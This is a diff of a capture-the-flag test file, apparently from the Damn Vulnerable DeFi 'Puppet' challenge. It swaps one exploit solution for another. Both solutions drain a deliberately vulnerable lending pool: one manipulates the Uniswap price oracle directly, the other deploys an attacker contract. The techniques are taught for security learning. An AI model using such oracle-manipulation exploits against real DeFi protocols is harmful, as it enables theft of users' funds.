@@ -113,23 +113,27 @@ describe("[Challenge] Puppet", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
-    await uniswapExchange.connect(player);
-    await token.connect(player);
-    await token.approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
-    const exchange = await uniswapExchange.tokenToEthSwapOutput(
-      ethers.utils.parseEther("9.9"),
-      PLAYER_INITIAL_TOKEN_BALANCE,
-      (await ethers.provider.getBlock("latest")).timestamp * 2,
-      { gasLimit: 1e6 }
-    );
-    await exchange.wait(1);
 
-    const tx = await lendingPool
+    [, , this.player2] = await ethers.getSigners();
+
+    const AttackerContractFactory = await ethers.getContractFactory(
+      "AttackPuppet",
+      this.player2
+    );
+    this.attackerContract = await AttackerContractFactory.deploy(
+      token.address,
+      lendingPool.address,
+      uniswapExchange.address
+    );
+    token
       .connect(player)
-      .borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {
-        value: ethers.utils.parseEther("20"),
-      });
-    await tx.wait(1);
+      .transfer(this.attackerContract.address, PLAYER_INITIAL_TOKEN_BALANCE);
+    await this.attackerContract.attack({
+      value: ethers.utils.parseEther("11"),
+    });
+    await token
+      .connect(this.player2)
+      .transfer(player.address, await token.balanceOf(this.player2.address));
   });
 
   after(async function () {
